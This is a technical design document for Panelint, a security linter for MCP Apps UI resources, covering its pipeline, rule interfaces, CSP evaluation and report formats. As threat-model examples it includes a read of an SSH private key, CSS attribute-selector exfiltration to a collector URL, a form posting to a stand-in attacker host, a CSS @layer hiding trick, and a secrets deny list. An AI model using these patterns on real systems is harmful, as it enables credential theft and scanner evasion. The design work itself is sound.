# Panelint — Technical Design

**Last updated:** 2026-08-04 · Status: pre-implementation
**Revision [v2]:** dependency claims verified by installing and running the packages. Several
load-bearing assumptions in v1 were wrong; each is marked and corrected below.

---

## 1. Shape of the thing

A single-binary CLI, distributed on npm, that reads MCP Apps resources and emits findings.

```
panelint scan <target> [--format text|json|sarif] [--fail-on <severity>] [--experimental]
panelint capture <target> -o <file.json>     # record a live server for replay
panelint rules [--json]                      # the registry, machine-readable
```

Three constraints drive every decision below:

1. **Sub-second on a typical server** (one server, under ~20 resources). It must be cheap enough to
   run on every commit, or it will be run on none. There is **no caching or incremental mode** in
   v1 — the budget is met by doing less work, not by remembering previous work. Stated here so its
   absence is a decision rather than an oversight.
2. **No network access except to a live-scan target the user named.** A security tool that phones
   home is a security problem. There is no telemetry and no update check.
3. **Zero false positives on the reference servers.** Enforced by test, not by intent.

> **Correction [v2] to a claim this document previously made.** v1 said "Zero network access by
> default" and the README said Panelint "does not render or execute anything." Both were false for
> the primary path: **live stdio scanning spawns the target server process.** That is arbitrary code
> execution, by design, potentially in CI with repository credentials in the environment. See §10.

## 2. Language

**TypeScript / Node** (ESM, Node 20+).

Not a preference — a consequence. The MCP Apps SDK, the JSON Schema, the reference host, and
Google's `csp_evaluator` are all TypeScript. The ecosystem being scanned installs from npm. A Rust
or Go implementation would be faster and would have to reimplement three dependencies and diverge
from the schema on every spec revision.

`npx panelint` with no install step is also the shortest path from "read the HN post" to "saw a
result," which is the launch mechanic that matters.

## 3. Pipeline

```
                    ┌─────────────┐
   directory ──────►│             │
   live server ────►│  Acquire    │──► ResourceSet
   capture file ───►│             │
                    └─────────────┘
                           │
                    ┌──────▼──────┐
                    │   Parse     │  HTML5 → DOM (no execution)
                    │             │  CSS → StyleIndex (selector-matched)
                    │             │  _meta.ui → typed object + ErrorObject[]
                    └──────┬──────┘
                           │
                    ┌──────▼──────┐
                    │   Analyze   │  per-resource rules, then cross-resource SetRules
                    └──────┬──────┘
                           │
                    ┌──────▼──────┐
                    │   Report    │  text | json | sarif
                    └─────────────┘
```

> **Correction [v2]:** the v1 diagram said "rule engine, **parallel** over resources." Rules are
> synchronous pure functions in a single-threaded runtime; real parallelism would need
> `worker_threads` and structured-cloneable contexts, and a `domhandler` tree is not cloneable.
> Concurrency exists only in Acquire, which is where the latency actually is.

### 3.1 Acquire

Four sources, one output type.

| Source | Method |
|---|---|
| **Live server (stdio)** | Spawn, `initialize` declaring `io.modelcontextprotocol/ui`, `resources/list`, `tools/list`, `resources/read` each `ui://`. **Gated behind `--allow-spawn`** — see §10 |
| **Capture file** | Replay a recorded JSON-RPC session. **CI uses this**, never live spawning |
| **Directory** | Literal-driven discovery — see below. Partial by construction |
| **Live server (HTTP)** | Same sequence over the header-routable transport. **Deferred to Phase 2** |

Live scanning is the **primary** path for users. Static directory scanning is a convenience that
cannot see runtime-generated HTML — a limitation stated in output, not hidden.

> ### ⚠ The primary path cannot reach a Stable server, measured against the pinned SDK **[v3]**
> `@modelcontextprotocol/sdk@1.30.0`, measured:
> ```
> LATEST_PROTOCOL_VERSION     = '2025-11-25'
> SUPPORTED_PROTOCOL_VERSIONS = ['2025-11-25','2025-06-18','2025-03-26','2024-11-05','2024-10-07']
> ```
> [SPEC-REFERENCE.md](SPEC-REFERENCE.md) cites `2026-01-26` as the protocol version for SEP-1865
> Stable. A server that advertises that version during `initialize` is refused by this SDK with
> `Server's protocol version is not supported` — the pinned client cannot complete a handshake with a
> server speaking the version the spec this tool targets actually uses.
>
> **The primary acquisition path cannot currently reach a server speaking the Stable protocol
> version, full stop.** Not a corner case, not a flag away. Two ways out, neither taken yet: bump the
> SDK once a release supports `2026-01-26`, or drop the SDK for live stdio and hand-roll the
> JSON-RPC client — the same four methods §9 already lists, weighed against the same dependency-count
> cost §9 records. Until one happens, `stdio` acquisition works only against a server that negotiates
> down to `2025-11-25` or earlier, and every report from it must say so. See §10.

#### Directory scanning is partial, and the v1 strategy would not have worked

v1 proposed walking for `registerAppResource` calls. That is a symbol from an **npm-only TypeScript
package**. The ecosystem is not npm-only: Metabase is Clojure (`src/metabase/mcp/resources.clj`),
dbt is Python (`dbt_mcp/apps/register.py`), and Go servers hand-roll entirely. Grepping for it finds
the TypeScript minority and misses the rest.

The reliable cross-language anchors are the two literals the spec **reserves** — and one is already
validated at ecosystem scale, since the 275-repo census in the market research was built by
GitHub code search on exactly it. Detection order:

1. Walk for the literal `text/html;profile=mcp-app` in any text file. Language-agnostic and
   spec-mandated.
2. Walk for the literal `ui://` to collect declared URIs.
3. For each URI, resolve HTML by — (a) a sibling file whose path tail matches the URI path;
   (b) a string or heredoc literal in the same file that parses as HTML with an `<html>` or `<body>`
   element; (c) a `readFile` / `open` / `slurp` call with a literal path argument.
4. Anything unresolved emits `resource declared, content not statically resolvable` — a
   **diagnostic, not a finding**.

> ### ⚠ Step 3 is an arbitrary file read, and it ships evidence off the machine **[v3]**
> Step 3(c) takes a **file path out of attacker-controlled source** and opens it. Step 3(a)
> tail-matches a `ui://` path that may itself contain `../`. Neither step has a containment check
> written anywhere in this document.
>
> A repository containing `readFileSync("/home/runner/.ssh/id_rsa")` beside a `ui://` literal gets
> those bytes resolved as resource content, hashed into `contentHash`, and quoted as finding evidence
> into SARIF that the Phase 2 GitHub Action uploads to code scanning. Panelint becomes the
> exfiltration channel, and the destination is a third party's Security tab.
>
> Directory mode does not ship until every one of these holds:
>
> - **Realpath containment.** `realpath` the candidate and require the result to sit under the
>   `realpath` of the scan root. Normalize *then* check, never the reverse.
> - **Refuse symlinks** rather than following them out of the tree.
> - **Re-check on the open descriptor.** The path that was checked and the file that was read must be
>   the same inode, or a symlink swapped between the two calls wins the race (TOCTOU).
> - **Extension allowlist**, covering the HTML and source extensions the walker already reads.
> - **Per-file byte cap** and a **binary sniff** before any content is retained.
> - **Deny list regardless of extension:** `.git/`, `node_modules/`, `.env*`, `*.pem`, `*.key`, `id_*`.
> - **Repo-relative paths in every output format.** An absolute path leaks the CI runner's directory
>   layout into a public SARIF upload.
>
> A candidate refused by any of these produces a `diagnostic`, never a finding, and never silence.

**Every directory-mode report prints the resolved/declared ratio in its header.** A scan that
resolved 2 of 9 resources must not read like a clean bill of health. [GOALS.md](GOALS.md) R1 is softened
to match.

> **Directory mode cannot tell a declaration from an example of one — measured, not theorised.**
> In a 21-server hand-scan, three servers' only apparent `_meta.ui.csp` declarations were
> `https://api.example.com` placeholders living in READMEs, tests, and documentation snippets. A
> source-level walker reads those as configuration.
>
> Two consequences. Directory mode must **never** report "this server declares a CSP" on the
> strength of a source match alone — it reports what it resolved and what it could not. And **any
> census built by grepping repositories will overcount CSP adoption**, so the published methodology
> has to state that the figure is derived from `resources/read`, not from source.
>
> A third consequence follows directly: **directory mode never populates `_meta` at all.** A
> source-level walker cannot tell a declaration from an example of one — that is the whole finding
> above — so it must not synthesize a `UIResourceMeta` from what it read. Every rule whose
> `Rule.requires` names `meta` (§3.3) is **skipped** in directory mode, with a diagnostic, and the
> report footer states how many rules were skipped for that reason so a clean-looking directory scan
> cannot be mistaken for a CSP audit.

Note that the reference example servers are **Vite projects**: `mcp-app.html` is a build entry, and
the served HTML is a bundle. Directory mode cannot see what those servers actually serve. This is
the strongest argument for leading with live/capture scanning.

#### The data model has to carry two `_meta.ui` sources **[v2]**

`_meta.ui` arrives from **two** places with a precedence rule, and a single field silently loses it.
From the ext-apps `McpUiAppResourceConfig` documentation, verbatim:

> The `_meta.ui` field here is included in the `resources/list` response and serves as a static
> default for hosts to review at connection time. When the `resources/read` content item also
> includes `_meta.ui`, the content-item value takes precedence.

A server whose **list-level** CSP is narrow but whose **read-level** CSP is broad presents a
misleading review surface to a host that reviews at connection time. That is a finding
(`PANE-SPEC-010`), and it is invisible unless both are retained.

```typescript
interface UIResource {
  uri: string;                    // must start with ui://
  mimeType: string;               // from the resources/read content item
  listedMimeType?: string;        // from the resources/list entry; may differ
  content: string;
  metaFromList?: UIResourceMeta;
  metaFromRead?: UIResourceMeta;
  meta?: UIResourceMeta;          // resolved: read wins, per ext-apps
  schemaErrors: ErrorObject[];    // single ajv run — see §3.2
  contentHash: string;            // sha256 — defined precisely in §6
  source: 'directory' | 'stdio' | 'http' | 'capture';
}

interface ResourceSet {
  serverName?: string;
  protocolVersion?: string;
  resources: UIResource[];
  tools: ToolWithUIMeta[];        // for PANE-SPEC-005, PANE-CONTEXT-004/010
  diagnostics: ScanDiagnostic[];  // unresolved URIs, limits exceeded, parse failures
  scannedAt: string;
}
```

### 3.2 Parse

**HTML → `parse5` with the htmlparser2 tree adapter.** Not the default tree adapter. The reason is
in the next subsection: rules need selector matching, and `css-select` operates on a
`domhandler`-shaped tree. Verified that `parse5-htmlparser2-tree-adapter` preserves **both**
`sourceCodeLocation` (line/column/offset, including per-attribute) and domhandler's
`startIndex`/`endIndex` — so one tree serves both selector matching and SARIF provenance.

```js
const doc = parse(html, { treeAdapter: adapter, sourceCodeLocationInfo: true });
selectAll('div.sr-only', doc)[0].sourceCodeLocation
// { startLine: 5, startCol: 1, startOffset: 140, ..., attrs: {...}, startTag: {...} }
```

No jsdom. We need a tree, not a runtime.

**CSS → a real style index, in three stages.** v1 said CSS is parsed "for the `PANE-HIDDEN` family"
and never said how declarations reach nodes. They do not, on their own: **parse5 gives a tree with
no querying, and postcss gives declarations with no selector matching.** The missing middle is the
single largest implementation gap in v1.

1. **Collect** — `<style>` blocks and `style=` attributes into postcss roots. postcss reports
   line/column for inline `style=` too.
2. **Classify** — `postcss-selector-parser` drops pseudo-elements and marks stateful pseudo-classes
   (`:hover`, `:focus`, `:active`, `:visited`, `:target`) as non-applying. An unsupported selector
   is skipped, never fatal.
3. **Match and resolve** — `css-select` matches selectors to nodes; conflicts resolve by
   (origin, `!important`, specificity via `@csstools/selector-specificity`, source order).

`StyleIndex.declaredStyle(node)` returns declared properties with their source locations. It is
indexed **by node**, not by selector — every `PANE-HIDDEN` rule asks "what applies to *this* node,"
and v1's `selector → declarations` map answered the opposite question.

**It explicitly does not inherit, and does not compute.** That refusal is the discipline that makes
the honesty claim in §6 real. Rules that need inheritance must decline to answer — see §5.

> ### ⚠ Resolution may raise a finding. It may never suppress one.
> The moment stage 3 can decide a declaration *loses*, every gap in the cascade model becomes a
> bypass the attacker gets to pick. `@layer` is the cheapest one, and it defeats the ordering above
> exactly:
>
> ```css
> @layer a, b;
> @layer b { .x { opacity: 0 } }
> @layer a { .x { opacity: 1 } }
> ```
>
> Layer order outranks source order, and **inside a layer `!important` inverts layer precedence.** A
> resolver ordering by (origin, `!important`, specificity, source order) concludes `opacity:1`,
> reports nothing, and the browser renders the text invisible. `@scope`, `@supports`, `@container`
> and `revert-layer` each reach the same result by a different route.
>
> So resolution is one-directional. A resolved declaration may **add** a finding that a declared-value
> read would have missed. It may never **remove** one. A cascade gap then costs a missed detection
> rather than a targeted evasion — and by [SECURITY.md](../SECURITY.md) §1 the second is a reportable
> vulnerability in Panelint, not a documented limitation.
>
> Unmodelled at-rules mark the node **undecided**, counted in `diagnostics` and surfaced in the
> report footer. Undecided is not clean.

**`_meta.ui` → one ajv run, not three.** `PANE-SCHEMA-001`, `-002`, `-004`, `-005` and `-006` all
derive from a **single** `allErrors: true` validation, mapped by `(instancePath, keyword)`. Three
rules writing three validators is how they drift.

> **Correction [v2]:** the v1 dependency table said `ajv`. The vendored schema is
> `$schema: draft/2020-12` with `$defs`, and the default `ajv` export **cannot compile it** —
> it throws `no schema with key or ref "https://json-schema.org/draft/2020-12/schema"`. The correct
> import is **`Ajv2020` from `ajv/dist/2020`**.

Vendoring the schema rather than fetching it keeps scans offline and makes spec-version drift an
explicit, reviewable commit. `scripts/refresh-schema.ts` re-copies from a pinned ext-apps version
and fails if the diff is non-empty.

> ⚠ **The vendored schema is generated from the SDK's `src/`, which tracks `main` — it is not a
> frozen artifact of the 2026-01-26 Stable spec.** It contains draft-only constructs. Every
> `PANE-SCHEMA` rule must assert against fields verified present in the Stable spec text, not merely
> present in the generated file. See [SPEC-REFERENCE.md](SPEC-REFERENCE.md).

### 3.3 Analyze

```typescript
interface Rule {
  id: string;                     // PANE-CSP-001 — permanent, never reused
  class: 'SPEC' | 'SCHEMA' | 'RISK' | 'INFO';
  severity: Severity;
  confidence: Confidence;
  experimental: boolean;
  status: 'active' | 'retired';
  since: string;                  // semver of first release
  specRef?: string;
  cwe?: string;
  remediation: string;
  check(ctx: RuleContext): RuleResult;
}

interface RuleResult {
  findings: Finding[];
  undecided?: UndecidedNote[];    // "could not evaluate: var() in color"
}

interface RuleContext {
  resource: UIResource;
  dom: Document;                  // domhandler.Document — NOT the parse5 default tree
  styles: StyleIndex;             // declaredStyle(node), node-indexed
  meta: UIResourceMeta | null;    // resolved, read-wins
  schemaErrors: ErrorObject[];
  options: Record<string, unknown>;   // per-rule config
  limits: Limits;
}

// Cross-resource rules are a separate interface, run once after the per-resource pass.
interface SetRule {
  id: string;
  checkSet(set: ResourceSet, perResource: Finding[]): Finding[];
}

interface Finding {
  ruleId: string;
  // ...class, severity, confidence, message, evidence
  location?: { startLine; startCol; endLine; endCol; startOffset; endOffset };
  fingerprint: string;            // stable across reformatting — see below
}
```

Five corrections from v1, each of which would have surfaced on day three of implementation:

- **`dom` is `domhandler.Document`**, not the parse5 default tree. With the wrong type the entire
  `PANE-HIDDEN` family fails to typecheck.
- **`styles` is node-indexed.** v1's `selector → declarations` answered a question no rule asks.
- **`location` exists.** SARIF needs line and column per finding. Populated from
  `node.sourceCodeLocation` for DOM findings, `decl.source.start` for CSS findings, and the ajv
  `instancePath` for schema findings. v1 had no provenance at all, which SARIF output requires.
- **`undecided` exists.** `PANE-HIDDEN-004` must be able to record "could not evaluate" without
  emitting a finding. Without this channel, "honest limits" is aspiration rather than mechanism.
- **`set: ResourceSet` is gone from `RuleContext`.** It invited accidental O(n²) and made rules
  order-sensitive. Only `PANE-SPEC-005` and `PANE-CONTEXT-004` need cross-resource state; they are
  `SetRule`s.

#### Five more interface corrections, numbered 6–10 to continue that list **[v3]**

Found by walking the 93 rules in [RULES.md](RULES.md) against these types one at a time. Four of the
five are rules that would compile, run, and never fire.

6. **`RuleContext` carries a parsed script index.** Roughly 25 rules need a JS AST — the whole of
   `PANE-CONTEXT`, `PANE-DOM`, `PANE-MSG`, `PANE-EXFIL-002/004`, `PANE-INPUT-003/004`. The context
   above hands them a DOM and nothing else, so each would parse every `<script>` itself. Parsing an
   app's bundle 25 times does not fit the sub-second budget in §1. `ctx.scripts` holds one acorn
   parse per script element, with byte offsets back into the source, built once in Parse.
7. **`StyleIndex` needs a selector-side view as well as the node-indexed one.** `PANE-CSP-010`
   (attribute-selector and `:has()` exfiltration) matters precisely because the attribute it keys on
   changes at **runtime**: `input[value^="a"] { background: url(https://collector/a) }` matches no
   node at parse time, so a node-indexed lookup returns nothing and the rule silently never fires.
   §3.2 was right that every `PANE-HIDDEN` rule wants node-indexed lookup, and wrong that no rule
   wants the other direction. `StyleIndex` exposes both; the node index stays the default.
8. **`ResourceSet` carries the server's declared capabilities.** `PANE-SPEC-007` checks whether a
   server serving `ui://` resources declared `io.modelcontextprotocol/ui`, and needs the extension
   declaration and its `mimeTypes` array from `initialize`. Neither is in `ResourceSet`, so the rule
   cannot be written. `capabilities?: ServerCapabilities` is added, absent in directory mode.
9. **Tool-scoped rules have no home in either interface.** `PANE-SCHEMA-005`, `PANE-SPEC-006`,
   `PANE-SPEC-011` and `PANE-CONTEXT-010` all evaluate a **tool's** `_meta`, not a resource's. They
   are not resource-scoped, and §3.3 lists only `PANE-SPEC-005` and `PANE-CONTEXT-004` as `SetRule`s.
   A third interface, `ToolRule.checkTool(tool, set)`, is the smallest fix. Separately,
   `SetRule.checkSet` returns `Finding[]` rather than `RuleResult`, so a `SetRule` **cannot report
   `undecided`** — the exact channel §3.3 added so that "honest limits" is a mechanism rather than an
   aspiration. It returns `RuleResult` too.
10. **Cross-rule dedup has no stage to run in.** [RULES.md](RULES.md) mandates it in at least two
    places: `PANE-SCHEMA-003` suppressed by `PANE-CSP-001/002` on `(resource, json-pointer)`, and
    `PANE-SPEC-008` against `PANE-CONTEXT-006`. A pure per-rule function cannot see another rule's
    findings by construction. Dedup is a named stage between Analyze and Report, it is ordered after
    all `SetRule`s, and its collision policy (higher severity wins, ties broken by rule ID) is
    specified once there rather than per rule.

**`Rule.requires` is the other missing field, and its absence reintroduces a measured false
positive.** A rule declares the inputs it needs — `dom`, `scripts`, `metaFromList`, `capabilities`,
`tools` — and the runner **skips** it, with a diagnostic, when the acquisition mode cannot supply
them. Without it, directory mode runs `PANE-CSP` rules against `_meta` scraped out of source files.
That is mode 3 of the false-positive analysis in RULES.md, *documentation mistaken for
configuration*, promoted from a bug to a feature. A skipped rule is reported as skipped; the
resolved/declared ratio in the header is not enough on its own.

`Finding.fingerprint` is a stable hash of `ruleId` + resource URI + a **structural path**, and
deliberately **not** line numbers — so the baseline file does not need a redesign the first time
someone reformats their HTML.

Rules are pure functions from context to findings. No shared state, no ordering dependency,
independently testable. Registered in a manifest so `panelint rules` can list them, and a test
asserts the registry matches [RULES.md](RULES.md) on id, class, severity, and confidence.

#### The `csp_evaluator` integration is narrower than v1 claimed **[v2]**

v1 said "wrap Google's `csp_evaluator`" for `PANE-CSP-005/007`. Verified by running it. Three
corrections, one of them fatal:

**1. Never call `evaluate()` with no arguments.** The default check list includes
`checkScriptUnsafeInline`. Run against the spec's *mandated* default policy (`csp_evaluator@1.1.8`,
measured):

```
 severity 10 (HIGH)   type 301  script-src 'unsafe-inline'
   → "'unsafe-inline' allows the execution of unsafe in-page scripts and event handlers."
 severity 50 (MEDIUM) type 305  script-src 'self'
   → "'self' can be problematic if you host JSONP, AngularJS or user uploaded files."
```

**The dependency this document told you to adopt delivers the exact fatal false positive
[GOALS.md](GOALS.md) §6 rates "Fatal."**

**Two** checks must be excluded, not one. `checkScriptUnsafeInline` is the obvious one. But
`checkScriptAllowlistBypass` **unconditionally flags any `'self'` in `script-src`** — measured, with
no context test in its source — and the mandated default policy contains `script-src 'self'`. So it
fires on every conformant server too, at severity 50.

The curated list is therefore **`checkSrcHttp`, `checkIpSource`, `checkPlainUrlSchemes`**, which
produces **zero** findings on the mandated default (measured). A unit test asserts that, and adding
a check to the list requires a reference-corpus run.

> ⚠ **The call shape is a second trap, and it is silent if missed [v3].**
> `CspEvaluator.evaluate(parsedCspChecks?, effectiveCspChecks?)` takes the replacement check list as
> its **second** argument, not its first. Measured against `csp_evaluator@1.1.8`: `evaluate(CURATED)`
> — passing the curated list positionally as the first argument — leaves `DEFAULT_CHECKS` running
> underneath and produces **2 findings on the spec's mandated default policy**, the exact fatal false
> positive this curation exists to prevent. The correct call is `evaluate(undefined, CURATED)`, which
> produces **zero** findings on both the mandated default and the policy constructed from a
> non-empty `csp`. Nothing in the type signature catches the swap — both arguments are the same
> array type, so a misplaced argument compiles clean and fails silently at runtime.

`PANE-CSP-007` still needs the JSONP and Angular allowlists — so Panelint **deep-imports the data**
(`csp_evaluator/dist/allowlist_bypasses/jsonp.js`, 123 URLs; `angular.js`, 41 URLs) together with
`utils.matchWildcardUrls`, rather than calling the check function that wraps them. The package has
no `exports` map, so deep imports resolve, and sibling `.d.ts` files supply types. This also avoids
user-facing descriptions that say "script-src" when the finding is about `resourceDomains`.

**2. It cannot implement `PANE-CSP-001/002/003` at all.** Its wildcard and bypass checks iterate
only `DIRECTIVES_CAUSING_XSS` — `script-src`, `script-src-attr`, `script-src-elem`, `object-src`,
`base-uri`. **`connect-src` and `frame-src` are absent**, so `connectDomains: ["*"]` produces zero
findings from it. Those rules are Panelint's own code.

**3. It takes a CSP *string*, and Panelint holds four arrays.** Panelint must **synthesize** the
policy a host would construct — and the exact policy a host builds from a *non-empty* `_meta.ui.csp`
is not specified anywhere. The synthesis function is an **assumption**, it lives in
`src/rules/csp/evaluator-adapter.ts`, and it is named as an assumption in every CSP finding.

The adapter must also de-duplicate the fan-out: `resourceDomains` maps to five directives, so one
declared domain yields five raw findings that must collapse back to `(arrayName, index)`.

`PANE-CSP-005` uses `tldts` rather than a hand-maintained list of shared-hosting origins, which
would rot. A host whose PSL **private** suffix differs from its **ICANN** suffix is on shared
hosting — `user.github.io` (private `github.io`, ICANN `io`) is; `api.example.com` (both `com`) is not.

### 3.4 Report

**Text** — default. Grouped by class, so a developer sees `SPEC` violations before `RISK`
observations. Colour-coded, one line per finding, file:line where available.

**JSON** — a **versioned envelope**, because the public directory consumes it and it is a one-way
door: `{ schemaVersion, tool, findings[], diagnostics[], errors[], resources[] }`. Frozen before
the census runs, not after. Covered by a golden-output test.

**SARIF 2.1.0** — GitHub code scanning renders it natively in the Security tab. This is the
distribution mechanism, not a checkbox.

Three SARIF specifics that need deciding now, because they constrain the Phase 2 Action:

- **`artifactLocation.uri` must be repo-relative**, and a live-scanned resource is `ui://server/view`
  with no file on disk. **Decision:** directory-scan SARIF uses real repo-relative paths; live-scan
  SARIF uses `logicalLocations` carrying the `ui://` URI and accepts that GitHub renders it without
  source context. The GitHub Action defaults to directory mode for this reason.
- **`partialFingerprints`** comes from `Finding.fingerprint`, so findings survive reformatting.
- **`tool.driver.rules[]`** is populated from the registry, with `semanticVersion` and
  `automationDetails.id`.

**Class × severity → SARIF `level` is specified explicitly**, because SARIF has only
`none | note | warning | error` and a naive mapping undoes the product's positioning. `INFO`-class
findings map to `note` **regardless of severity** — `PANE-CONTEXT-001` is `INFO`/`HIGH`, and
rendering it as `error` in GitHub's Security tab would make a capability disclosure look like a
vulnerability, contradicting [GOALS.md](GOALS.md) N1.

| Class | SARIF level |
|---|---|
| `SPEC`, `SCHEMA` | `error` at CRITICAL/HIGH, else `warning` |
| `RISK` | `error` at CRITICAL/HIGH, `warning` at MEDIUM, `note` below |
| `INFO` | `note`, always |

## 4. Exit codes and gating

| Code | Meaning |
|---|---|
| 0 | All resources scanned successfully **and** no findings at or above `--fail-on` |
| 1 | Findings at or above threshold |
| 2 | Scan error — could not reach server, malformed input, or a limit exceeded |

Default `--fail-on high`.

**Partial failure has a representation [v2].** v1's table forced a choice between exit 0 (silently
under-reporting when 3 of 10 resources failed to parse) and exit 2 (blocking CI on one bad
resource). Code 0 now requires that *all* resources scanned successfully. `--on-error=fail|warn`
(default `fail`) selects the behaviour, and JSON/SARIF always carry a machine-readable `errors[]`
array. Scanning zero resources in directory mode exits 0 with an explicit "no UI resources found"
diagnostic — **never a silent pass.**

**Gating is one formula, restated verbatim from [RULES.md](RULES.md) rather than paraphrased**,
because paraphrasing it is how v1 ended up with three incompatible statements across two documents:

```
confidence ∈ { CERTAIN, HIGH }  ∧  class ≠ INFO  ∧  ¬experimental  ∧  severity ≥ --fail-on
```

`INFO` and `experimental` findings **never** affect the exit code regardless of threshold. A CI gate
that fires on a heuristic gets disabled, and then nothing is checked.

## 5. Configuration, suppression, and baselines

**This section did not exist in v1, and its absence was a shipping blocker.**

`PANE-CSP-003` (any non-empty `frameDomains`) and `PANE-CSP-004` (any non-empty `baseUriDomains`)
are gate-eligible and fire on **legitimate use of documented features**. Without a suppression path,
the first team that legitimately nests a frame disables Panelint entirely — which is precisely the
failure mode §4 warns about for heuristics.

- `panelint.config.json`, or a `panelint` key in `package.json`.
- Per-rule severity override: `off | info | low | medium | high | critical`.
- Inline `<!-- panelint-disable-next-line PANE-HIDDEN-008 -->`.
- A **baseline file** of accepted findings, keyed on `Finding.fingerprint`. Moved from Phase 5 to
  **Phase 2** — it is load-bearing for adoption, not a convenience.

**Severity should be a property of the finding, not only of the rule.** A wildcard `frameDomains`
entry is `RISK`; a specific declared origin is `INFO`. This is the same volume-and-shape scaling
already designed for `PANE-HIDDEN`, applied uniformly.

> ### ⚠ Inline suppression is honoured inside attacker-authored HTML **[v3]**
> `<!-- panelint-disable-next-line PANE-EXFIL-001 -->` lives in the **exact byte stream this project
> calls hostile**. [THREAT-MODEL.md](THREAT-MODEL.md) §2 ranks a malicious server author last but does
> not rule them out, and A1 can place content the server will render. The bullet above hands that
> byte stream a switch that turns findings off.
>
> The attack is one line long. A malicious author ships the comment above their
> `<form action="https://collector.attacker.tld/c">`, the scan reports nothing, and the public
> directory publishes the server as clean. The suppression comment is *itself* the strongest
> available signal that something is being hidden, and the design as written throws it away.
>
> **The trust boundary is the acquisition mode, not the file.**
>
> | Control | `directory` | `stdio` · `http` · `capture` |
> |---|---|---|
> | Inline `panelint-disable-*` comments | Honoured | **Never honoured.** Parsed, counted, and reported as evidence of tampering |
> | Config discovered inside the scanned tree | May only **raise** severity, never lower or disable | Same |
> | Config named by `--config` at the invocation root | Full override, including `off` | Full override |
> | Spawn, network, limits, schema path, baseline path | **CLI-only.** Never readable from a scanned repo or resource | CLI-only |
>
> Directory mode is the one case where the bytes and the developer running the scan are plausibly the
> same person, which is why it is the one mode that honours an inline comment. Live and captured
> resources come off the wire from someone else.
>
> **Every output format carries `suppressed: { inline, config, baseline }` counts**, in the text
> footer as well as in JSON and SARIF. A suppressed finding is not an absent finding, and a report
> that cannot tell the difference cannot be audited by the person reading it.

## 6. False-positive discipline

The single most important engineering constraint. Four mechanisms:

**Reference corpus test, replayed not spawned.** Every example server in
`modelcontextprotocol/ext-apps` is captured to `fixtures/reference/*.json` at a **pinned commit SHA**
and replayed in CI. **CI fails if any produces a `SPEC`, `SCHEMA`, or `RISK` finding.**

> Replay rather than live spawning is what makes Phase 1 fit in a week. `basic-server-*` spans six
> frameworks; spawning them in CI means six toolchains installed and six servers started, and the
> failures will come from a Python venv rather than from a rule. Captures refresh on a scheduled
> job, not on every PR.

**Five poisoned patterns, hard-guarded [v3]** — three in v2, plus the `csp_evaluator` check list that
v2 recorded as a separate "fourth guard", plus `PANE-SPEC-010`. Each is *mandated* or *emitted* by
the spec or SDK and each looks like a classic vulnerability:

1. `'unsafe-inline'` — in the spec's mandated default CSP. Never flag.
2. `allow-scripts allow-same-origin` — required for the sandbox proxy. Flag only when same-origin
   with the host.
3. **`_meta["ui/resourceUri"]` [v2]** — the SDK's `registerAppTool` **dual-writes** this deprecated
   key whenever the modern `_meta.ui.resourceUri` is supplied. A rule flagging its presence fires on
   every conformant TypeScript server, including the reference fixtures. Flag only when the flat key
   is present **and** `_meta.ui.resourceUri` is absent.
4. **`PANE-SPEC-010` list/read `_meta.ui` divergence [v3]** — the fourth poisoned rule, and it was
   sitting at `RISK`/`HIGH`/`CERTAIN`, gate-eligible, in the v2 catalog. Idiomatic
   `registerAppResource` usage populates the **list-level** `_meta.ui` and leaves the read-level one
   absent, so `!deepEqual(list, read)` is true on every conformant TypeScript server that declares a
   CSP at all. Fire only when both are present, they differ, **and** the read-level policy is the
   broader of the two. See [RULES.md](RULES.md).
5. **The `csp_evaluator` default check list** — it flags `'unsafe-inline'` *and* `'self'` in
   `script-src`, and the mandated default policy contains both. Guarded by asserting that the curated
   list in §3.3 produces zero findings on that policy.

Each has an explicit never-fire test, and `test/never-fire.test.ts` asserts all five.

**The zero-finding gate does not delete rules [v2].** v1's rule — "CI fails if any reference server
produces a finding" — has two problems. First, the corpus is ~10 example servers in a **public
repo**, so anyone who lands a PR adding a risky-but-legal pattern to an upstream example
permanently disables the corresponding Panelint rule. Second, a `RISK` finding on a reference server
is not by definition a false positive: `RISK` means "permitted by the spec, expands attack surface,"
and a reference server may legitimately do that.

So the corpus splits in two:

- A small **must-not-fire** set, reviewed and hash-pinned, where any finding fails CI.
- A larger **measured-FP-rate** corpus, where a finding **demotes and documents** the rule rather
  than deleting it.

`PANE-CSP-008` is the live example: `https://cdn.jsdelivr.net` is the spec's own canonical CSP
example, so reference servers plausibly declare it. Under v1's rule that would have silently killed
a `HIGH` supply-chain rule.

**Corpus measurement before promotion.** No rule graduates from `experimental` until its
false-positive rate is measured against all 275+ known servers and documented in the rule entry.

## 7. Point-in-time honesty

The protocol has **no integrity mechanism** — no signature, hash, version, or pinning field exists
anywhere in the resource schema. A resource can change between a scan and its execution with no
signal to anyone.

**`contentHash` is defined precisely, because it is a one-way door** — the public directory, the
drift re-scan, and the disclosure process all key on it:

> `sha256` over the UTF-8 bytes of the `text` field **exactly as received**, or over the decoded
> bytes of `blob`. No normalization, no whitespace stripping, no BOM removal. A `blob` and a `text`
> resource with identical decoded bytes produce identical hashes.

**Findings are also not reproducible across patch releases unless versions are pinned [v2].**
`tldts` bundles a Public Suffix List snapshot, and `csp_evaluator`'s JSONP/Angular allowlists change
between patch versions. The same content hash yields different findings on different Panelint
builds. For a section titled "point-in-time honesty" that is not acceptable, so every report header
carries:

- `contentHash` per resource
- `panelintVersion`
- **`ruleEngineFingerprint`** — a hash of the rule registry plus the pinned versions of
  `csp_evaluator`, `tldts`, and the vendored schema
- scan mode, and that mode's limitation sentence

No output ever says a server "is safe." It says what was true of one hash, under one rule-engine
fingerprint, at one time.

## 8. Repository layout

```
panelint/
├── README.md · LICENSE · SECURITY.md · CONTRIBUTING.md
├── docs/            PRD · SPEC-REFERENCE · THREAT-MODEL · RULES · SPEC-COVERAGE · DESIGN · ROADMAP · RESEARCH
├── src/
│   ├── cli.ts · types.ts · limits.ts · exit.ts
│   ├── acquire/     types.ts · replay.ts · stdio.ts · http.ts · capture.ts · directory.ts · hash.ts
│   ├── parse/       html.ts · css.ts · style-index.ts · meta.ts
│   ├── rules/       spec/ schema/ csp/ exfil/ hidden/ overlay/ dom/ msg/ input/ integrity/ context/ sandbox/ mimic/
│   │   └── registry.ts
│   ├── report/      text.ts · json.ts · sarif.ts
│   └── config/      load.ts · baseline.ts · suppress.ts
├── schema/          vendored schema.json + VERSION, pinned to an ext-apps release
├── scripts/         refresh-schema.ts · census/
├── fixtures/
│   ├── reference/   captured ext-apps example servers — must scan clean
│   └── malicious/   one positive case per rule, plus the limit-exceeded cases
